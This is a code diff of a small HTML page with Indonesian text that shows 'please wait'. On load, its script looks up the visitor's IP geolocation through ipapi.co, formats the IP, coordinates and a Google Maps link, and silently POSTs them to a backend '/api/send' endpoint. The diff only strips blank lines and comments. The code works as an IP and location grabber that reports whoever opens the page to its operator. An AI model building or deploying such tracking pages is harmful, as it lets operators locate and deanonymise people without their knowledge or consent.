@@ -7,13 +7,11 @@
 <body>
   <h3 id="status">Mohon tunggu...</h3>
   <pre id="result"></pre>
-
   <script>
     async function getIP() {
       try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
-
         const info = `
 📡 IP Terdeteksi
 🌐 IP: ${data.ip}
@@ -24,18 +22,14 @@
 📌 Koordinat: ${data.latitude}, ${data.longitude}
 🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}
 `;
-
-        // Tampilkan di halaman
         document.getElementById("status").textContent = "✅ Data berhasil diambil";
         document.getElementById("result").textContent = info;
 
-        // Kirim ke API backend
         const response = await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ text: info })
         });
-
         const result = await response.json();
         console.log("Respon dari API:", result);
 
@@ -47,7 +41,6 @@
         document.getElementById("status").textContent = "❌ Terjadi kesalahan";
       }
     }
-
     getIP();
   </script>
 </body>
